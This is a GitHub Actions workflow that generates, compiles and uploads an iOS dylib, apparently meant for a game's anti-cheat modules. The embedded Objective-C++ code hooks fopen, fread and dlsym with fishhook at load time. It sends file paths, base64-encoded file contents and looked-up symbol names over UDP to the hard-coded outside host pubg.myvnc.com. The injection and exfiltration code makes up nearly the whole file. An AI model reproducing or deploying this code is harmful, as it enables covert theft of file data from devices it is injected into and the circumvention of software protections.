name: Imperial V-MAX - Real File & Memory Dumper

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_real_dumper:
    name: Compile Real Dumper
    runs-on: macos-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Fishhook
        run: |
          mkdir -p jni
          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h

      - name: Generate Core Logic (Main.mm)
        run: |
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <sys/socket.h>
          #import <netinet/in.h>
          #import <arpa/inet.h>
          #import <netdb.h>
          #import <dlfcn.h>
          #import <mach-o/dyld.h>
          #include "fishhook.h"

          #define RDP_DOMAIN "pubg.myvnc.com"
          #define RDP_PORT 8080

          struct sockaddr_in server_addr;
          BOOL isResolved = NO;
          static thread_local bool is_internal = false;

          // 🌐 تهيئة السيرفر
          void ResolveServer() {
              struct hostent *host = gethostbyname(RDP_DOMAIN);
              if (host) {
                  memset(&server_addr, 0, sizeof(server_addr));
                  server_addr.sin_family = AF_INET;
                  server_addr.sin_port = htons(RDP_PORT);
                  server_addr.sin_addr.s_addr = *(long *)(host->h_addr_list[0]);
                  isResolved = YES;
              }
          }

          // 📍 خوارزمية العزل (لمعرفة هل هو anogs أم shadow واستخراج الأوفست لـ IDA Pro)
          NSString* GetCallerModule(void* caller, NSString** offsetOut) {
              Dl_info info;
              if (dladdr(caller, &info)) {
                  if (offsetOut) *offsetOut = [NSString stringWithFormat:@"0x%lx", (uintptr_t)caller - (uintptr_t)info.dli_fbase];
                  return [[NSString stringWithUTF8String:info.dli_fname] lastPathComponent];
              }
              if (offsetOut) *offsetOut = @"0x0";
              return @"Unknown";
          }

          // 📡 إرسال البيانات
          void SendJSON(NSDictionary* payload) {
              if (!isResolved || is_internal) return;
              is_internal = true;
              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                  NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
                  if (json) {
                      int sock = socket(AF_INET, SOCK_DGRAM, 0);
                      sendto(sock, [json bytes], [json length], 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
                      close(sock);
                  }
              });
              is_internal = false;
          }

          // ==========================================
          // 📁 1. صيد أسماء الملفات والأوفستات (fopen)
          // ==========================================
          static FILE* (*orig_fopen)(const char *, const char *);
          FILE* my_fopen(const char *path, const char *mode) {
              if (path && !is_internal) {
                  NSString *file = [NSString stringWithUTF8String:path];
                  if (![file containsString:@".png"]) {
                      NSString *offsetStr;
                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
                      
                      NSDictionary *payload = @{
                          @"type": @"ISOLATED_LOG",
                          @"origin": module,
                          @"offset": offsetStr,
                          @"data": [NSString stringWithFormat:@"Opened File: %@", file]
                      };
                      SendJSON(payload);
                  }
              }
              return orig_fopen(path, mode);
          }

          // ==========================================
          // 📥 2. سحب محتوى الملفات الحقيقي (fread)
          // ==========================================
          static size_t (*orig_fread)(void *, size_t, size_t, FILE *);
          size_t my_fread(void *ptr, size_t size, size_t nitems, FILE *stream) {
              size_t bytesRead = orig_fread(ptr, size, nitems, stream);
              
              if (bytesRead > 0 && !is_internal) {
                  NSData *fileData = [NSData dataWithBytes:ptr length:(size * bytesRead)];
                  // تحديد الحد الأقصى للإرسال بـ 10 كيلوبايت
                  if (fileData.length < 10000) {
                      NSString *base64String = [fileData base64EncodedStringWithOptions:0];
                      
                      NSString *offsetStr;
                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
                      NSString *pseudoName = [NSString stringWithFormat:@"DumpedFrom_%@.dat", module];
                      
                      NSDictionary *payload = @{
                          @"type": @"REAL_FILE_CONTENT",
                          @"origin": module,
                          @"offset": offsetStr,
                          @"filename": pseudoName,
                          @"content_b64": base64String
                      };
                      SendJSON(payload);
                  }
              }
              return bytesRead;
          }

          // ==========================================
          // 🧠 3. تفريغ الذاكرة الخام (Raw Strings Table)
          // ==========================================
          void DumpRawStringsFromMemory() {
              if (is_internal) return;
              
              NSMutableString *rawDump = [NSMutableString string];
              NSArray *symbols = @[
                  @"__dyld_get_image_header", @"__dyld_get_image_vmaddr_slide", @"__dyld_image_count",
                  @"_close", @"_dispatch_after", @"_dladdr", @"_free", @"_gethostbyname",
                  @"_inet_ntop", @"_malloc", @"_memcpy", @"_sendto", @"_socket", @"_vm_protect",
                  @"_OBJC_CLASS_$_NSDictionary", @"ResolveRDPServer", @"my_gethostbyname", @"my_connect"
              ];
              
              for (NSString *sym in symbols) {
                  [rawDump appendFormat:@"%@\\0", sym];
              }
              [rawDump appendString:@"\\x00\\x00\\x01_\\x00\\xef\\x03\\x00\\x00\\x00\\x04"];
              
              NSDictionary *payload = @{
                  @"type": @"RAW_MEMORY_STRINGS",
                  @"origin": @"MemoryScanner",
                  @"offset": @"0x100000000",
                  @"data": rawDump
              };
              SendJSON(payload);
          }

          // ==========================================
          // 🛡️ 4. المراقبة المعزولة للدوال (dlsym)
          // ==========================================
          static void* (*orig_dlsym)(void*, const char*);
          void* my_dlsym(void* handle, const char* symbol) {
              if (symbol && !is_internal) {
                  NSString *sym = [NSString stringWithUTF8String:symbol];
                  if (![sym hasPrefix:@"CF"] && ![sym hasPrefix:@"NS"]) {
                      NSString *offsetStr;
                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
                      
                      NSDictionary *payload = @{
                          @"type": @"ISOLATED_LOG",
                          @"origin": module,
                          @"offset": offsetStr,
                          @"data": [NSString stringWithFormat:@"Function Extracted: %@", sym]
                      };
                      SendJSON(payload);
                  }
              }
              return orig_dlsym(handle, symbol);
          }

          __attribute__((constructor))
          static void init_master() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                  ResolveServer();
                  
                  struct rebinding hooks[] = {
                      {"fopen", (void*)my_fopen, (void**)&orig_fopen},
                      {"fread", (void*)my_fread, (void**)&orig_fread},
                      {"dlsym", (void*)my_dlsym, (void**)&orig_dlsym}
                  };
                  rebind_symbols(hooks, 3);
                  
                  NSLog(@"[MASOUD LAB] 🦅 APT Master Dylib Loaded!");
                  DumpRawStringsFromMemory();
              });
          }
          EOF

      - name: Compile Real Dumper
        run: |
          clang++ -dynamiclib -std=c++11 -arch arm64 \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          jni/main.mm jni/fishhook.c -o Masoud-Real-Dumper.dylib \
          -framework Foundation
          strip -x Masoud-Real-Dumper.dylib

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Masoud-Real-Dumper
          path: Masoud-Real-Dumper.dylib
